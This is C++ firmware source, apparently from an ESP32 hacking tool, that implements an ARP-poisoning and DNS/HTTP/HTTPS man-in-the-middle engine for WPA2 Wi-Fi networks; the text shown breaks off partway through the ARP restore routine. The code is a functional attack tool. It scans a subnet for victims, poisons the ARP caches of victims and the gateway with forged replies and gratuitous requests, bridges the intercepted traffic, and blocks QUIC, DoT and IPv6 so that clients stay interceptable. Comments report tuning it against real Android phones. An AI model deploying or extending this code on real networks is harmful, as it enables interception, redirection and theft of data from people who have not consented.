#if !defined(LITE_VERSION)

/**
 * @file net_spoof.cpp
 * @brief Headless ARP / DNS / HTTP interception engine (see net_spoof.h).
 *
 * Layout of the file:
 *   1. state and small helpers (MAC strings, checksums)
 *   2. ethernet frame transmit
 *   3. ARP: build, send, resolve, discovery scan
 *   4. ARP spoof pairs + the service task that keeps them poisoned
 *   5. the layer-2 hook that copies interesting frames into a slot pool
 *   6. the service task body: answer DNS queries / HTTP requests
 *   7. rules, captures and the public API
 *
 * Everything that leaves the radio goes out through esp_wifi_internal_tx() on
 * the *station* interface, so it is encrypted by the hardware with the
 * association key. That is what makes this work on WPA2 (see net_spoof.h).
 *
 * Concurrency: the layer-2 hook runs in the WiFi receive path and must never
 * allocate or block, so it only claims a preallocated slot, copies bytes into
 * it and marks it ready. All real work (frame building, rule matching) happens
 * in the service task. Engine state is guarded by a FreeRTOS mutex, held only
 * for short copies and never across a blocking call.
 */

#include "net_spoof.h"
#include "net_spoof_cert.h"

#include "core/wifi/wifi_common.h"
#include "modules/wifi/wifi_atks.h"
#include "modules/wifi/wifi_raw_portal.h"
#include <esp_heap_caps.h>
#include <esp_log.h>
#include <globals.h>

#include <WiFi.h>
#include <esp_https_server.h>
#include <esp_netif.h>
#include <esp_netif_net_stack.h>
#include <esp_system.h>
#include <esp_private/wifi.h>
#include <esp_wifi.h>
#include <lwip/etharp.h>
#include <lwip/inet.h>
#include <lwip/netif.h>
#include <lwip/sockets.h>
#include <lwip/tcpip.h>
#include <mbedtls/platform.h>

#include <freertos/FreeRTOS.h>
#include <freertos/semphr.h>
#include <freertos/task.h>

// ===========================================================================
// 1. State and small helpers
// ===========================================================================

/// One queued frame handed from the layer-2 hook to the service task.
struct NetSpoofSlot {
    volatile uint8_t state; // 0 free, 1 filling, 2 ready
    uint8_t kind;           // 0 = DNS query, 1 = HTTP request, 2 = TCP SYN
    uint8_t clientMac[6];
    uint8_t _pad;
    uint32_t srcIp;         // wire order, as seen in the frame
    uint32_t dstIp;         // wire order
    uint16_t srcPort;
    uint16_t dstPort;
    uint32_t seq;
    uint32_t ack;
    uint8_t flags;
    uint16_t payloadLen;    // full L4 payload length on the wire
    uint16_t copyLen;       // bytes actually copied into data
    uint8_t data[NETSPOOF_HOOK_COPY];
};

struct NetSpoofPair {
    IPAddress target;
    IPAddress gateway;
    uint8_t targetMac[6];
    uint8_t gatewayMac[6];
    uint32_t since;
};

// --- target / pair storage -------------------------------------------------
// These were fixed arrays in .bss, sized for a handful of hosts. "All devices"
// on a /24 means ~200 pairs, and at 24 B per pair plus 48 B per target that is
// ~17 KB of INTERNAL DRAM - the memory the Wi-Fi/BLE bring-up and the MITM page
// itself have to fit into. Allocate both tables from PSRAM on first use, with a
// small internal fallback so a denied allocation degrades instead of crashing.
// Neither accessor is called from the layer-2 hook.
static NetSpoofTarget *s_targetsMem = nullptr;
static int s_targetsCap = 0;
static NetSpoofTarget s_targetsFallback[16];
static NetSpoofTarget *s_targets() {
    if (s_targetsMem) return s_targetsMem;
    size_t bytes = sizeof(NetSpoofTarget) * NETSPOOF_MAX_TARGETS;
    s_targetsMem = (NetSpoofTarget *)heap_caps_calloc(1, bytes, MALLOC_CAP_SPIRAM);
    if (!s_targetsMem) s_targetsMem = (NetSpoofTarget *)heap_caps_calloc(1, bytes, MALLOC_CAP_8BIT);
    if (s_targetsMem) {
        s_targetsCap = NETSPOOF_MAX_TARGETS;
        return s_targetsMem;
    }
    s_targetsCap = 16;
    Serial.println("[NETSPOOF] target table: no PSRAM, 16-slot fallback");
    return s_targetsFallback;
}

static NetSpoofPair *s_pairsMem = nullptr;
static int s_pairsCap = 0;
static NetSpoofPair s_pairsFallback[8];
static NetSpoofPair *s_pairs() {
    if (s_pairsMem) return s_pairsMem;
    size_t bytes = sizeof(NetSpoofPair) * NETSPOOF_MAX_PAIRS;
    s_pairsMem = (NetSpoofPair *)heap_caps_calloc(1, bytes, MALLOC_CAP_SPIRAM);
    if (!s_pairsMem) s_pairsMem = (NetSpoofPair *)heap_caps_calloc(1, bytes, MALLOC_CAP_8BIT);
    if (s_pairsMem) {
        s_pairsCap = NETSPOOF_MAX_PAIRS;
        return s_pairsMem;
    }
    s_pairsCap = 8;
    Serial.println("[NETSPOOF] pair table: no PSRAM, 8-slot fallback");
    return s_pairsFallback;
}

static int s_targetCount = 0;
static int s_pairCount = 0;
static uint32_t s_arpFrames = 0;
static uint32_t s_arpSince = 0;

static NetSpoofRule s_dnsRules[NETSPOOF_MAX_RULES];
static int s_dnsRuleCount = 0;
static NetSpoofRule s_redirRules[NETSPOOF_MAX_RULES];
static int s_redirCount = 0;
static NetSpoofRule s_injectRules[NETSPOOF_MAX_RULES];
static int s_injectCount = 0;
/// HTML a captive-portal probe is answered with (the `portal` payload line).
static String s_portalPage;

static bool s_dnsActive = false;
static bool s_httpActive = false;
static bool s_httpsActive = false;
// True when the HTTPS endpoint started the DNS responder itself (there were no
// user rules); stopping HTTPS can then stop it again. If DNS was already up, it
// keeps running with the user's rules after HTTPS stops.
static bool s_httpsOwnsDns = false;
static httpd_handle_t s_httpsServer = NULL;
static uint32_t s_dnsQueries = 0;
static uint32_t s_dnsAnswers = 0;
// Observe-only (recon) mode: the hook records what a frame says and bridges it
// untouched, so a payload that arms no rule can still show the traffic without
// redirecting anybody. See netspoof_observe_start().
static volatile bool s_observe = false;
static uint32_t s_httpRequests = 0;
static uint32_t s_httpRedirected = 0;
static uint32_t s_httpInjected = 0;
static uint32_t s_httpsRequests = 0;
static uint32_t s_httpsRedirected = 0;
static uint32_t s_httpsInjected = 0;
// 1.4 transport-fallback telemetry. Written from the receive path (both cores)
// as well as the service task; a counter is a statistic, so a lost increment
// during a race is not a bug and an atomic would cost airtime for nothing.
static volatile uint32_t s_quicDropped = 0;
static volatile uint32_t s_dotDropped = 0;
static volatile uint32_t s_svcbSuppressed = 0;
static volatile uint32_t s_ipv6Dropped = 0;

/// True while an MITM rule set is armed and the client must be kept on the
/// IPv4/TCP path this engine can see.
///
/// Every suppression below used to test `s_httpActive || s_httpsActive` on its
/// own. That leaves the classic DNS-only payload (`dns * <ip>`) exposed: a
/// dual-stack client resolves over IPv6 and an HTTP/3 client streams over QUIC
/// without ever asking for a page, so the engine sees `dns=0/0` while the phone
/// happily loads the site. A DNS responder is a rule set too, so it arms the
/// same barrier. Observe-only recon is deliberately excluded - it must stay
/// invisible, which is why `s_observe` is not part of this.
static bool _mitmFallbackGuard() { return s_httpActive || s_httpsActive || s_dnsActive; }

// The capture ring is scratch data (the last eight intercepted frames) and used
// to sit in .bss: eight entries of ~530 B = 4.2 KB of INTERNAL DRAM for the
// whole boot, which is the memory the Wi-Fi/BLE bring-up and the MITM page
// itself have to fit into. Allocate it from PSRAM on first use instead; the
// internal heap is only the fallback. Called from the service task, never from
// the layer-2 hook, so a one-time heap call is safe here.
static NetSpoofCapture *s_captureRing = nullptr;
static NetSpoofCapture *s_captures() {
    if (s_captureRing == nullptr) {
        size_t bytes = sizeof(NetSpoofCapture) * NETSPOOF_MAX_CAPTURES;
        s_captureRing = (NetSpoofCapture *)heap_caps_malloc(bytes, MALLOC_CAP_SPIRAM);
        if (s_captureRing == nullptr) s_captureRing = (NetSpoofCapture *)heap_caps_malloc(bytes, MALLOC_CAP_8BIT);
    }
    return s_captureRing;
}
static int s_captureCount = 0;      // valid entries, newest at index 0
static uint32_t s_captureTotal = 0; // monotonic; never wraps in practice

static NetSpoofSlot s_slots[NETSPOOF_QUEUE_DEPTH];
static portMUX_TYPE s_slotMux = portMUX_INITIALIZER_UNLOCKED;

static SemaphoreHandle_t s_mtx = NULL;      // guards pairs / rules / captures
static TaskHandle_t s_svcTask = NULL;
static volatile bool s_svcRun = false;

static netif_input_fn s_prevInput = NULL;
static struct netif *s_hookedNetif = NULL;

static uint8_t s_myMac[6] = {0};
static uint8_t s_bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// --- transparent forwarding ------------------------------------------------
// With the ARP poison up, every frame a victim sends to its "gateway" arrives
// here. Forwarding puts those frames back on the air toward the real gateway
// (and the replies back toward the victim) with the MACs rewritten, which is
// the only way a poisoned client can keep a working internet path: the ESP has
// no NAT/router, so without a bridge a redirected client can never load the
// page it was sent to. That is what turned "redirect to the video" into a dead
// end before (the video host resolved to this board, which cannot fetch it).
static bool s_forwardActive = false;
static uint32_t s_fwdFrames = 0;
static uint32_t s_fwdBytes = 0;
static uint32_t s_fwdDropped = 0;
static uint8_t s_gwMac[6] = {0};
static bool s_gwMacOk = false;

/// Victim IP -> MAC, learned from the frames that pass through.
///
/// A reply from the gateway carries the victim's IP but is addressed to this
/// board's MAC (the gateway's ARP entry for the victim is poisoned), so the
/// destination MAC has to be looked up by IP, not by the frame header.
/// 256 slots in PSRAM, indexed by the last octet of the address: every host on
/// a /24 lands in its own slot, so a lookup is one array read instead of the
/// linear scan the 16-entry table needed - and 16 entries could not hold a
/// 200-victim run at all (replies would have been forwarded to the wrong MAC).
#define NETSPOOF_FWD_PEERS 256
struct NetSpoofPeer {
    uint32_t ip;
    uint8_t mac[6];
    uint16_t _pad;
};
static NetSpoofPeer *s_fwdPeerMem = nullptr;
static portMUX_TYPE s_fwdMux = portMUX_INITIALIZER_UNLOCKED;

/// Called from the control task (start / scan), never from the receive path.
static NetSpoofPeer *s_fwdPeersEnsure() {
    if (s_fwdPeerMem) return s_fwdPeerMem;
    size_t bytes = sizeof(NetSpoofPeer) * NETSPOOF_FWD_PEERS;
    s_fwdPeerMem = (NetSpoofPeer *)heap_caps_calloc(1, bytes, MALLOC_CAP_SPIRAM);
    if (!s_fwdPeerMem) s_fwdPeerMem = (NetSpoofPeer *)heap_caps_calloc(1, bytes, MALLOC_CAP_8BIT);
    return s_fwdPeerMem;
}

static void _fwdPeersClear() {
    NetSpoofPeer *peers = s_fwdPeersEnsure();
    if (!peers) return;
    portENTER_CRITICAL(&s_fwdMux);
    memset(peers, 0, sizeof(NetSpoofPeer) * NETSPOOF_FWD_PEERS);
    portEXIT_CRITICAL(&s_fwdMux);
}

/// Flows whose TCP handshake this board passed straight through to the server.
///
/// Intercepting only the data segment of a bridged flow splits the connection
/// between two TCP stacks: the SYN-ACK the client holds came from the real
/// server, so the sequence numbers of the forged answer do not match and the
/// client sits there until it times out - which is exactly what a real phone did
/// against this engine (a bridged SYN, then an answered HTTP request, then
/// 10 s of nothing). Once a handshake is bridged the rest of that flow is
/// bridged too.
#define NETSPOOF_FLOW_MAX 64
struct NetSpoofFlow {
    uint32_t srcIp;
    uint32_t dstIp;
    uint16_t sport;
    uint16_t dport;
    uint32_t ts;
};
static NetSpoofFlow s_flows[NETSPOOF_FLOW_MAX];
static portMUX_TYPE s_flowMux = portMUX_INITIALIZER_UNLOCKED;

static int _flowSlot(uint32_t srcIp, uint32_t dstIp, uint16_t sport, uint16_t dport) {
    uint32_t h = srcIp ^ (dstIp << 1) ^ ((uint32_t)sport << 16) ^ dport;
    return (int)(h & (NETSPOOF_FLOW_MAX - 1));
}

static void _flowMark(uint32_t srcIp, uint32_t dstIp, uint16_t sport, uint16_t dport) {
    int i = _flowSlot(srcIp, dstIp, sport, dport);
    portENTER_CRITICAL(&s_flowMux);
    s_flows[i].srcIp = srcIp;
    s_flows[i].dstIp = dstIp;
    s_flows[i].sport = sport;
    s_flows[i].dport = dport;
    s_flows[i].ts = millis();
    portEXIT_CRITICAL(&s_flowMux);
}

static bool _flowBridged(uint32_t srcIp, uint32_t dstIp, uint16_t sport, uint16_t dport) {
    int i = _flowSlot(srcIp, dstIp, sport, dport);
    bool hit = false;
    portENTER_CRITICAL(&s_flowMux);
    if (s_flows[i].srcIp == srcIp && s_flows[i].dstIp == dstIp && s_flows[i].sport == sport &&
        s_flows[i].dport == dport && (millis() - s_flows[i].ts) < 120000)
        hit = true;
    portEXIT_CRITICAL(&s_flowMux);
    return hit;
}

/// Hosts a redirect points at: they must keep resolving for real, or every
/// redirect to a name would resolve back to this board and loop forever.
#define NETSPOOF_DNS_PASS_MAX 4
static String s_passHosts[NETSPOOF_DNS_PASS_MAX];
static int s_passCount = 0;

/// Frames built in these buffers; internal RAM so they stay DMA-capable.
static uint8_t s_txFrame[NETSPOOF_FRAME_MAX + 16];
static uint8_t s_l4[NETSPOOF_FRAME_MAX];
static uint8_t s_l4b[NETSPOOF_FRAME_MAX];
static uint16_t s_ipId = 0;

static void _lock() {
    if (s_mtx) xSemaphoreTake(s_mtx, portMAX_DELAY);
}
static void _unlock() {
    if (s_mtx) xSemaphoreGive(s_mtx);
}

static void _ensure_mutex() {
    if (!s_mtx) s_mtx = xSemaphoreCreateMutex();
}

static String _macStr(const uint8_t *m) {
    char buf[18];
    snprintf(
        buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]
    );
    return String(buf);
}

static bool _sameMac(const uint8_t *a, const uint8_t *b) { return memcmp(a, b, 6) == 0; }

static bool _isZeroMac(const uint8_t *m) {
    for (int i = 0; i < 6; i++)
        if (m[i]) return false;
    return true;
}

/// Wire-order 32-bit of an IPAddress (same byte order as the network).
static uint32_t _ip32(const IPAddress &ip) { return (uint32_t)ip; }

// --- checksums (16-bit ones-complement, fed with wire-order data) ---------

static uint32_t _sum16(const uint8_t *data, size_t len, uint32_t acc) {
    size_t i = 0;
    for (; i + 1 < len; i += 2) acc += ((uint16_t)data[i] << 8) | data[i + 1];
    if (i < len) acc += (uint16_t)data[i] << 8;
    return acc;
}

static uint16_t _finish16(uint32_t acc) {
    while (acc >> 16) acc = (acc & 0xFFFF) + (acc >> 16);
    return (uint16_t)(~acc);
}

static void _put16(uint8_t *p, uint16_t v) {
    p[0] = (uint8_t)(v >> 8);
    p[1] = (uint8_t)(v & 0xFF);
}

static void _put32(uint8_t *p, uint32_t v) {
    p[0] = (uint8_t)(v >> 24);
    p[1] = (uint8_t)(v >> 16);
    p[2] = (uint8_t)(v >> 8);
    p[3] = (uint8_t)v;
}

/**
 * @brief Read a 32-bit big-endian field into a host-order value.
 *
 * TCP sequence numbers are arithmetic values (the forged ACK is seq + payloadLen),
 * so they have to be read as numbers rather than copied as opaque bytes. Pair this
 * with _put32(), which writes a host-order value back out big-endian.
 */
static uint32_t _rd32(const uint8_t *p) {
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

// ===========================================================================
// 2. Ethernet frame transmit
// ===========================================================================

// ---------------------------------------------------------------------------
// mbedtls allocator: the TLS handshake needs ~32 KB of record buffers, and the
// prebuilt mbedtls in this Arduino build calls plain calloc() (internal RAM)
// because CONFIG_MBEDTLS_EXTERNAL_MEM_ALLOC is off. With the Wi-Fi driver up
// there is not enough internal RAM for that, so mbedtls_ssl_setup() fails with
// ESP_ERR_MBEDTLS_SSL_SETUP_FAILED and every HTTPS connection is reset. Prefer
// PSRAM for large mbedtls blocks and keep small ones internal; free() works for
// both. This is a throwaway server, so the slower PSRAM path is irrelevant.
static void *_nsMbedtlsCalloc(size_t n, size_t size) {
    if (n == 0 || size == 0) return NULL;
    size_t total = n * size;
    if (total / n != size) return NULL;
    void *p = NULL;
    if (total >= 1024) p = heap_caps_calloc(1, total, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    if (p == NULL) p = heap_caps_calloc(1, total, MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    return p;
}

static void _nsMbedtlsFree(void *p) {
    if (p) heap_caps_free(p);
}

static bool s_mbedtlsAllocSet = false;

static void _ensureMbedtlsPsram() {
    if (s_mbedtlsAllocSet) return;
    s_mbedtlsAllocSet = true;
    mbedtls_platform_set_calloc_free(_nsMbedtlsCalloc, _nsMbedtlsFree);
}

static bool _tx(const uint8_t *frame, size_t len) {
    if (len < 14 || len > NETSPOOF_FRAME_MAX) return false;
    if (esp_wifi_internal_tx(WIFI_IF_STA, (void *)frame, (uint16_t)len) != ESP_OK) return false;
    return true;
}

/// Wrap an ethernet header around @p payload and put it on the air.
static bool _txEth(
    const uint8_t dst[6], const uint8_t src[6], uint16_t etherType, const uint8_t *payload, size_t len
) {
    if (14 + len > sizeof(s_txFrame)) return false;
    memcpy(s_txFrame, dst, 6);
    memcpy(s_txFrame + 6, src, 6);
    _put16(s_txFrame + 12, etherType);
    memcpy(s_txFrame + 14, payload, len);
    return _tx(s_txFrame, 14 + len);
}

// ===========================================================================
// 3. ARP
// ===========================================================================

#define ARP_OP_REQUEST 1
#define ARP_OP_REPLY 2

/**
 * @brief Send one ARP packet.
 *
 * @param ethDst ethernet destination
 * @param senderMac/senderIp the (possibly forged) ARP sender pair
 * @param targetMac/targetIp the ARP target pair
 */
// Calls the ARP frame builder directly. Vandeta routed this through its
// developer-mode patch slot (VND_SLOT_MITM_BUILD_FRAME); that overlay is not
// part of Bruce, so the indirection is gone and the body is called as-is.
bool mitm_build_frame_body(
    const uint8_t ethDst[6], const uint8_t senderMac[6], const uint8_t senderIp[4],
    const uint8_t targetMac[6], const uint8_t targetIp[4], uint16_t opcode, int repeat
);

__attribute__((noinline)) static bool _sendArp(
    const uint8_t ethDst[6], const uint8_t senderMac[6], const uint8_t senderIp[4],
    const uint8_t targetMac[6], const uint8_t targetIp[4], uint16_t opcode, int repeat
) {
    return mitm_build_frame_body(ethDst, senderMac, senderIp, targetMac, targetIp, opcode, repeat);
}

__attribute__((noinline, used)) bool mitm_build_frame_body(
    const uint8_t ethDst[6], const uint8_t senderMac[6], const uint8_t senderIp[4],
    const uint8_t targetMac[6], const uint8_t targetIp[4], uint16_t opcode, int repeat
) {
    uint8_t frame[42];
    memcpy(frame, ethDst, 6);
    memcpy(frame + 6, s_myMac, 6);
    _put16(frame + 12, 0x0806); // ARP

    uint8_t *arp = frame + 14;
    _put16(arp + 0, 1);      // ethernet
    _put16(arp + 2, 0x0800); // IPv4
    arp[4] = 6;
    arp[5] = 4;
    _put16(arp + 6, opcode);
    memcpy(arp + 8, senderMac, 6);
    memcpy(arp + 14, senderIp, 4);
    memcpy(arp + 18, targetMac, 6);
    memcpy(arp + 24, targetIp, 4);

    bool any = false;
    for (int i = 0; i < repeat; i++) {
        if (_tx(frame, sizeof(frame))) any = true;
        s_arpFrames++;
        if (repeat > 1) vTaskDelay(pdMS_TO_TICKS(2));
    }
    return any;
}

static struct netif *_staNetif() {
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta) return NULL;
    return (struct netif *)esp_netif_get_netif_impl(sta);
}

bool netspoof_wifi_ready(String &err) {
    if (!wifiConnected || !WiFi.isConnected() || WiFi.status() != WL_CONNECTED) {
        err = "not associated with an access point (connect first: wifi.connect(ssid, pw))";
        return false;
    }
    return true;
}

void netspoof_my_mac(uint8_t mac[6]) {
    if (!wifiConnected) return; // leave mac untouched when the station is down
    esp_wifi_get_mac(WIFI_IF_STA, s_myMac);
    if (mac) memcpy(mac, s_myMac, 6);
}

/// Look an address up in the LwIP ARP table.
static bool _arpTableLookup(const IPAddress &ip, uint8_t mac[6]) {
    struct netif *iface = _staNetif();
    if (!iface) return false;

    ip4_addr_t want = {_ip32(ip)};
    ip4_addr_t *foundIp = NULL;
    eth_addr *foundMac = NULL;
    struct netif *foundNetif = NULL;

    bool ok = false;
    LOCK_TCPIP_CORE();
    for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
        if (!etharp_get_entry(i, &foundIp, &foundNetif, &foundMac)) continue;
        if (!foundIp || !foundMac) continue;
        if (foundIp->addr != want.addr) continue;
        memcpy(mac, foundMac->addr, 6);
        ok = true;
        break;
    }
    UNLOCK_TCPIP_CORE();
    return ok && !_isZeroMac(mac);
}

#include "ping/ping_sock.h"

/// Force an ARP entry with an ICMP echo.
///
/// Some clients answer a ping but drop the bare ARP request lwIP sends on its
/// own (measured on the 2.4 GHz router used for these tests: ARPScanner lists
/// the very same laptop, a single etharp_request for it stays unanswered). A
/// ping goes through the normal outbound path, so lwIP queues its own ARP
/// request, retries it and learns the MAC from the reply.
static volatile bool s_pingDone = false;

static void _pingEndCb(esp_ping_handle_t hdl, void *args) {
    (void)args;
    s_pingDone = true;
    esp_ping_stop(hdl);
    esp_ping_delete_session(hdl);
}

static bool _pingResolveMac(const IPAddress &ip, uint8_t mac[6]) {
    ip_addr_t target;
    target.type = IPADDR_TYPE_V4;
    target.u_addr.ip4.addr = _ip32(ip);

    s_pingDone = false;
    esp_ping_config_t cfg = ESP_PING_DEFAULT_CONFIG();
    cfg.target_addr = target;
    cfg.count = 2;
    cfg.interval_ms = 150;
    cfg.timeout_ms = 400;
    cfg.task_stack_size = 3072;

    esp_ping_callbacks_t cbs = {};
    cbs.cb_args = NULL;
    cbs.on_ping_end = _pingEndCb;

    esp_ping_handle_t handle = NULL;
    if (esp_ping_new_session(&cfg, &cbs, &handle) != ESP_OK) return false;
    if (esp_ping_start(handle) != ESP_OK) {
        esp_ping_delete_session(handle);
        return false;
    }
    uint32_t start = millis();
    while (!s_pingDone && millis() - start < 2000) vTaskDelay(pdMS_TO_TICKS(20));
    if (!s_pingDone) esp_ping_delete_session(handle); // the callback did not run
    return _arpTableLookup(ip, mac);
}

bool netspoof_resolve_mac(const IPAddress &ip, uint8_t mac[6], uint32_t timeoutMs) {
    if (_arpTableLookup(ip, mac)) return true;

    struct netif *iface = _staNetif();
    if (!iface) return false;

    ip4_addr_t target = {_ip32(ip)};
    LOCK_TCPIP_CORE();
    etharp_cleanup_netif(iface);
    UNLOCK_TCPIP_CORE();

    // One request and a silent wait is not enough on Wi-Fi: a client in power
    // save (a laptop with its radio dozing, which is exactly the target of a
    // MITM run) drops the first request and answers a later one. ARPScanner
    // works because its sweep keeps asking for seconds, so ask again every
    // NETSPOOF_ARP_RETRY_MS inside the timeout instead of giving up after one
    // frame. Measured on the 2.4 GHz router used for these tests: a single
    // request resolved the gateway but never the laptop.
    uint32_t start = millis();
    if (timeoutMs < 500) timeoutMs = 500;
    uint32_t lastAsk = 0;
    bool asked = false;
    while (millis() - start < timeoutMs) {
        if (!asked || millis() - lastAsk >= NETSPOOF_ARP_RETRY_MS) {
            LOCK_TCPIP_CORE();
            etharp_request(iface, &target);
            UNLOCK_TCPIP_CORE();
            lastAsk = millis();
            asked = true;
        }
        vTaskDelay(pdMS_TO_TICKS(50));
        if (_arpTableLookup(ip, mac)) return true;
    }

    // Still nothing: ping once. This is the path ARPScanner relies on, and the
    // only one that resolved this network's laptop.
    return _pingResolveMac(ip, mac);
}

bool netspoof_gateway_info(IPAddress &gw, uint8_t mac[6]) {
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta) return false;
    esp_netif_ip_info_t info;
    if (esp_netif_get_ip_info(sta, &info) != ESP_OK) return false;
    if (info.gw.addr == 0) return false;

    gw = IPAddress(info.gw.addr);
    if (_arpTableLookup(gw, mac)) return true;

    // The gateway MAC is usually the AP's BSSID on an infrastructure network.
    wifi_ap_record_t ap;
    if (esp_wifi_sta_get_ap_info(&ap) == ESP_OK) {
        memcpy(mac, ap.bssid, 6);
        return true;
    }
    return false;
}

/**
 * @brief ARP-scan the local subnet, filling the target list.
 *
 * One ARP request is queued per address and the table is drained every
 * ARP_TABLE_SIZE requests, exactly like Bruce's ARPScanner. The wait per
 * address is what bounds the runtime, so the whole scan finishes inside
 * @p timeoutMs even on a /24.
 */
int netspoof_scan_targets(uint32_t timeoutMs, String &err) {
    if (!netspoof_wifi_ready(err)) return -1;

    struct netif *iface = _staNetif();
    if (!iface) {
        err = "station netif not available";
        return -1;
    }

    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    esp_netif_ip_info_t info;
    if (esp_netif_get_ip_info(sta, &info) != ESP_OK) {
        err = "could not read the station IP configuration";
        return -1;
    }

    esp_wifi_get_mac(WIFI_IF_STA, s_myMac);

    IPAddress myIp((uint32_t)info.ip.addr);
    IPAddress gwIp((uint32_t)info.gw.addr);
    uint8_t gwMac[6] = {0};
    bool gwMacOk = netspoof_gateway_info(gwIp, gwMac);

    uint32_t myHe = ntohl((uint32_t)myIp);
    uint32_t maskHe = ntohl((uint32_t)IPAddress((uint32_t)info.netmask.addr));
    uint32_t network = ntohl((uint32_t)gwIp) & maskHe;
    uint32_t broadcast = network | (~maskHe);
    uint32_t hosts = broadcast - network - 1;
    if (hosts == 0 || hosts > 65534) {
        err = "unsupported subnet size";
        return -1;
    }

    // Budget: at most ~15 ms per host, capped by the caller's timeout.
    uint32_t perHost = 15;
    uint32_t budget = timeoutMs > 0 ? timeoutMs : 8000;
    uint32_t maxHosts = budget / perHost;
    if (maxHosts < 8) maxHosts = 8;

    s_targetCount = 0;
    NetSpoofTarget *tgt = s_targets();
    int tableCount = 0;
    uint32_t sent = 0;
    uint32_t start = millis();

    LOCK_TCPIP_CORE();
    etharp_cleanup_netif(iface);
    UNLOCK_TCPIP_CORE();

    for (uint32_t ipHe = network + 1; ipHe < broadcast && sent < maxHosts; ipHe++) {
        if (ipHe == myHe || ipHe == ntohl((uint32_t)gwIp)) continue;

        ip4_addr_t target = {htonl(ipHe)};
        LOCK_TCPIP_CORE();
        etharp_request(iface, &target);
        UNLOCK_TCPIP_CORE();
        sent++;
        tableCount++;

        if (tableCount >= ARP_TABLE_SIZE) {
            tableCount = 0;
            // Drain into the target list.
            LOCK_TCPIP_CORE();
            for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
                ip4_addr_t *foundIp = NULL;
                eth_addr *foundMac = NULL;
                struct netif *foundNetif = NULL;
                if (!etharp_get_entry(i, &foundIp, &foundNetif, &foundMac)) continue;
                if (!foundIp || !foundMac) continue;
                if (s_targetCount >= s_targetsCap) break;
                if (_isZeroMac(foundMac->addr)) continue;

                IPAddress hostIp((uint32_t)foundIp->addr);
                bool dup = false;
                for (int d = 0; d < s_targetCount; d++) {
                    if (tgt[d].ip == hostIp) {
                        dup = true;
                        break;
                    }
                }
                if (dup) continue;

                NetSpoofTarget &t = tgt[s_targetCount++];
                t.ip = hostIp;
                memcpy(t.mac, foundMac->addr, 6);
                t.macStr = _macStr(t.mac);
                t.gateway = (hostIp == gwIp);
                t.spoofed = false;
                memset(t.pairedWith, 0, 6);
            }
            UNLOCK_TCPIP_CORE();
        }

        vTaskDelay(pdMS_TO_TICKS(perHost));
    }

    LOCK_TCPIP_CORE();
    etharp_cleanup_netif(iface);
    UNLOCK_TCPIP_CORE();

    // The gateway is usually missing from the table (we never ARP for it); add it
    // explicitly so getTargets() always shows the interesting host.
    bool haveGw = false;
    for (int i = 0; i < s_targetCount; i++)
        if (tgt[i].gateway) haveGw = true;
    if (!haveGw && s_targetCount < s_targetsCap) {
        uint8_t gmac[6];
        if (gwMacOk || netspoof_resolve_mac(gwIp, gmac, 1500)) {
            if (!gwMacOk) memcpy(gwMac, gmac, 6);
            NetSpoofTarget &t = tgt[s_targetCount++];
            t.ip = gwIp;
            memcpy(t.mac, gwMac, 6);
            t.macStr = _macStr(gwMac);
            t.gateway = true;
            t.spoofed = false;
            memset(t.pairedWith, 0, 6);
        }
    }

    Serial.printf(
        "[NETSPOOF] scan: %d hosts in %lums (budget %lu, sent %lu)\n",
        s_targetCount,
        (unsigned long)(millis() - start),
        (unsigned long)budget,
        (unsigned long)sent
    );
    return s_targetCount;
}

int netspoof_target_count() { return s_targetCount; }

const NetSpoofTarget *netspoof_target(int idx) {
    if (idx < 0 || idx >= s_targetCount) return NULL;
    return &s_targets()[idx];
}

void netspoof_clear_targets() { s_targetCount = 0; }

// ===========================================================================
// 4. ARP spoof pairs + service task
// ===========================================================================

static int _pairCountNow() {
    _lock();
    int n = s_pairCount;
    _unlock();
    return n;
}

/// Copy one pair out under the lock.
///
/// The service task used to snapshot the whole table into a local array, which
/// was fine for 8 pairs but needs 4.8 KB of stack for 200 - more than the 4 KB
/// service task stack. One entry at a time keeps the stack flat at any size.
static bool _pairCopy(int idx, NetSpoofPair *out) {
    if (!out) return false;
    _lock();
    if (idx < 0 || idx >= s_pairCount) {
        _unlock();
        return false;
    }
    *out = s_pairs()[idx];
    _unlock();
    return true;
}

static void _poisonPair(const NetSpoofPair &p, int burst) {
    uint8_t tIp[4], gIp[4];
    uint32_t t = _ip32(p.target), g = _ip32(p.gateway);
    memcpy(tIp, &t, 4);
    memcpy(gIp, &g, 4);

    // Tell the target that the gateway is us.
    _sendArp(p.targetMac, s_myMac, gIp, p.targetMac, tIp, ARP_OP_REPLY, burst);
    // Tell the gateway that the target is us.
    _sendArp(p.gatewayMac, s_myMac, tIp, p.gatewayMac, gIp, ARP_OP_REPLY, burst);

    // A reply alone is not enough against a client whose neighbour entry is
    // still valid: Android (and iOS) keep the entry they have and ignore an
    // unsolicited *reply* for it, so the first requests of a run went straight
    // to the real gateway for ~30 s until the entry finally aged out (measured
    // 2026-11-02 on Android 13: http counter 0/0 for the first two probes, 7/11
    // by the end of the run). An ARP *request* from the same identity is the
    // announcement the kernel does act on - gratuitous ARP - so each side gets
    // one, addressed to it alone. Staying unicast keeps the poison on the one
    // target; a broadcast version would rewrite every host's cache on the LAN.
    _sendArp(p.targetMac, s_myMac, gIp, p.targetMac, gIp, ARP_OP_REQUEST, burst);
    _sendArp(p.gatewayMac, s_myMac, tIp, p.gatewayMac, tIp, ARP_OP_REQUEST, burst);
}

/// Restore the two real mappings (unicast reply + broadcast request, RFC 826).
static void _restorePair(const NetSpoofPair &p) {
    uint8_t tIp[4], gIp[4];
    uint32_t t = _ip32(p.target), g = _ip32(p.gateway);
    memcpy(tIp, &t, 4);
    memcpy(gIp, &g, 4);

    for (int round = 0; round < 3; round++) {
        _sendArp(p.targetMac, p.gatewayMac, gIp, p.targetMac, tIp, ARP_OP_REPLY, 3);
